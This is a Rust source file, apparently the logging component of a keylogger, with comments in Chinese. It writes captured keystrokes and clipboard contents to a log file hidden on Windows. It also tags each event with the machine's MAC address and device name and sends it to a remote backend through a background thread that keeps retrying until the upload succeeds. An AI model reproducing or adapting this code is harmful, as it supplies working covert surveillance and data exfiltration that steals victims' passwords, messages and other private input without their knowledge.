use crate::config;
use crate::get_mac_addr;
use chrono::Local;
use serde::Serialize;
use lazy_static::lazy_static;
use std::sync::mpsc;

#[cfg(windows)]
use std::os::windows::fs::OpenOptionsExt;

use std::{
    fs::OpenOptions,
    io::{self, Write},
    sync::Mutex,
    thread,
};

const FILE_ATTRIBUTE_HIDDEN: u32 = 0x2;

lazy_static! {
    static ref EVENT_CHANNEL: (Mutex<mpsc::SyncSender<LogEvent>>, thread::JoinHandle<()>) = {
        let (sender, receiver) = mpsc::sync_channel(100);
        let handle = thread::spawn(move || {
            let client = reqwest::blocking::Client::new();
            for event in receiver {
                let backend_url = config::get_backend_url();
                loop {
                    match client.post(&backend_url).json(&event).send() {
                        Ok(response) if response.status().is_success() => break,
                        Ok(response) => eprintln!("Server error: {}", response.status()),
                        Err(e) => eprintln!("Send error: {}", e),
                    }
                    thread::sleep(std::time::Duration::from_secs(1));
                }
            }
        });
        (Mutex::new(sender), handle)
    };
}

#[derive(Serialize, Clone)]
struct LogEvent {
    device_id: String,
    device_name: String,
    event_type: String,
    content: String,
    timestamp: i64,
    timezone: String,
}

#[derive(Serialize)]
pub enum EventType {
    KeyboardPress,
    ClipboardCopy,
}

impl EventType {
    fn as_str(&self) -> &'static str {
        match self {
            EventType::KeyboardPress => "按下按键",
            EventType::ClipboardCopy => "复制文本",
        }
    }

    fn as_event_type(&self) -> &'static str {
        match self {
            EventType::KeyboardPress => "keyboard_press",
            EventType::ClipboardCopy => "clipboard_copy",
        }
    }
}

pub fn log_event(event_type: EventType, content: &str) {
    let timestamp = Local::now();
    let offset = timestamp.offset();

    // 写入本地日志
    let time_str = format!(
        "{} UTC{:+}",
        timestamp.format("%Y/%m/%d-%H:%M:%S%.3f"),
        offset.local_minus_utc() / 3600
    );

    let mut options = OpenOptions::new();
    options.append(true).create(true);

    #[cfg(windows)]
    options.custom_flags(FILE_ATTRIBUTE_HIDDEN);

    let file = match options.open("latest.log") {
        Ok(file) => file,
        Err(e) => {
            eprintln!("Error opening log file: {}", e);
            return;
        }
    };

    let mut file = io::BufWriter::new(file);

    if let Err(e) = writeln!(file, "{} {} {}", time_str, event_type.as_str(), content) {
        eprintln!("Error writing to log file: {}", e);
    }


    // 发送日志到后端
    let log_event = LogEvent {
        device_id: get_mac_addr::get_mac_addr(),
        device_name: config::get_device_name(),
        event_type: event_type.as_event_type().to_string(),
        content: content.to_string(),
        timestamp: timestamp.timestamp(),
        timezone: format!("UTC{:+}", offset.local_minus_utc() / 3600),
    };
    
    if let Err(e) = EVENT_CHANNEL.0.lock().unwrap().send(log_event) {
        eprintln!("Failed to queue log event: {}", e);
    }
}
